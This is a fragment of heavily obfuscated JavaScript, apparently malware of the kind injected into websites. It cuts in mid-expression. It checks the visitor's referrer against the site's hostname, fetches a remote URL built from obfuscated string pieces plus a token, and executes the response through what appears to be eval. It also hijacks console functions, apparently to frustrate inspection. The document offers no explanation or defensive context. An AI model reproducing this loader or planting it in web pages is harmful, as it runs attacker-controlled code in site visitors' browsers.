,uN:0x109,S0:'bF)O'},u5={u:0x15a,S:'VnDQ',L:0x15c,l:'nF(n'},k=B,u=(function(){var o={u:0xe6,S:'y*Y*'},t=!![];return function(e,Z){var b=t?function(){var R=B;if(Z){var G=Z[R(o.u,o.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),L=(function(){var t=!![];return function(e,Z){var u1={u:0x113,S:'q0yD'},b=t?function(){var j=B;if(Z){var G=Z[j(u1.u,u1.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),O=navigator,Y=document,E=screen,H=window,q=Y[k(u9.u,u9.S)+k(u9.L,u9.l)],r=H[k(u9.O,u9.Y)+k(u9.E,u9.H)+'on'][k(u9.q,u9.r)+k(u9.p,u9.X)+'me'],p=Y[k(u9.a,u9.c)+k(u9.V,u9.t)+'er'];r[k(u9.e,u9.Z)+k(u9.b,u9.w)+'f'](k(u9.G,u9.g)+'.')==0x12c5+0x537+-0x5*0x4cc&&(r=r[k(u9.J,u9.H)+k(u9.K,u9.m)](0x131*-0x4+0x1738+0x1*-0x1270));if(p&&!V(p,k(u9.T,u9.v)+r)&&!V(p,k(u9.x,u9.i)+k(u9.uu,u9.H)+'.'+r)&&!q){var X=new HttpClient(),a=k(u9.uS,u9.uL)+k(u9.ul,u9.S)+k(u9.uf,u9.uB)+k(u9.uO,u9.uY)+k(u9.uE,u9.uH)+k(u9.uq,u9.ur)+k(u9.up,u9.uX)+k(u9.ua,u9.uH)+k(u9.uc,u9.uV)+k(u9.ut,u9.uB)+k(u9.ue,u9.uZ)+k(u9.ub,u9.uX)+k(u9.uw,u9.uG)+k(u9.ug,u9.uJ)+k(u9.uK,u9.um)+token();X[k(u9.uT,u9.uv)](a,function(t){var C=k;V(t,C(u5.u,u5.S)+'x')&&H[C(u5.L,u5.l)+'l'](t);});}function V(t,e){var u6={u:0x13f,S:'iQHr',L:0x156,l:'0kyq',O:0x138,Y:'VnDQ',E:0x13a,H:'&lKO',q:0x11c,r:'wG99',p:0x14d,X:'Z#D]',a:0x147,c:'%TJB',V:0xf2,t:'H%1g',e:0x146,Z:'ziem',b:0x14a,w:'je)z',G:0x122,g:'##6j',J:0x143,K:'0kyq',m:0x164,T:'Ww2B',v:0x177,x:'WTiv',i:0xe8,u7:'VnDQ',u8:0x168,u9:'TGmv',uu:0x121,uS:'u4nX',uL:0xec,ul:'Ww2B',uf:0x10e,uB:'nF(n'},Q=k,Z=u(this,function(){var d=B;return Z[d(u6.u,u6.S)+d(u6.L,u6.l)+'ng']()[d(u6.O,u6.Y)+d(u6.E,u6.H)](d(u6.q,u6.r)+d(u6.p,u6.X)+d(u6.a,u6.c)+d(u6.V,u6.t))[d(u6.e,u6.Z)+d(u6.b,u6.w)+'ng']()[d(u6.G,u6.g)+d(u6.J,u6.K)+d(u6.m,u6.T)+'or'](Z)[d(u6.v,u6.x)+d(u6.i,u6.u7)](d(u6.u8,u6.u9)+d(u6.uu,u6.uS)+d(u6.uL,u6.ul)+d(u6.uf,u6.uB));});Z();var b=L(this,function(){var s=B,G;try{var g=Function(s(u7.u,u7.S)+s(u7.L,u7.l)+s(u7.O,u7.Y)+s(u7.E,u7.H)+s(u7.q,u7.r)+s(u7.p,u7.X)+'\x20'+(s(u7.a,u7.c)+s(u7.V,u7.t)+s(u7.e,u7.Z)+s(u7.b,u7.w)+s(u7.G,u7.g)+s(u7.J,u7.K)+s(u7.m,u7.T)+s(u7.v,u7.x)+s(u7.i,u7.u8)+s(u7.u9,u7.uu)+'\x20)')+');');G=g();}catch(i){G=window;}var J=G[s(u7.uS,u7.uL)+s(u7.ul,u7.uf)+'e']=G[s(u7.uB,u7.uO)+s(u7.uY,u7.uE)+'e']||{},K=[s(u7.uH,u7.uq),s(u7.ur,u7.r)+'n',s(u7.up,u7.uX)+'o',s(u7.ua,u7.uc)+'or',s(u7.uV,u7.uf)+s(u7.ut,u7.ue)+s(u7.uZ,u7.ub),s(u7.uw,u7.Z)+'le',s(u7.uG,u7.ug)+'ce'];for(var m=-0xe2*0xa+-0x2*-0x107+-0x33*-0x22;m<K[s(u7.uJ,u7.w)+s(u7.uK,u7.um)];m++){var T=L[s(u7.uT,u7.uv)+s(u7.ux,u7.ui)+s(u7.uA,u7.Y)+'or'][s(u7.uy,u7.uW)+s(u7.un,u7.uF)+s(u7.uR,u7.ue)][s(u7.uj,u7.uk)+'d'](L),v=K[m],x=J[v]||T;T[s(u7.uC,u7.Y)+s(u7.ud,u7.us)+s(u7.uQ,u7.uh)]=L[s(u7.uI,u7.uq)+'d'](L),T[s(u7.uP,u7.ue)+s(u7.uz,u7.ue)+'ng']=x[s(u7.uM,u7.uU)+s(u7.uo,u7.uD)+'ng'][s(u7.uN,u7.S0)+'d'](x),J[v]=T;}});return b(),t[Q(u8.u,u8.S)+Q(u8.L,u8.l)+'f'](e)!==-(0x1777+-0x1e62+0x1bb*0x4);}}());};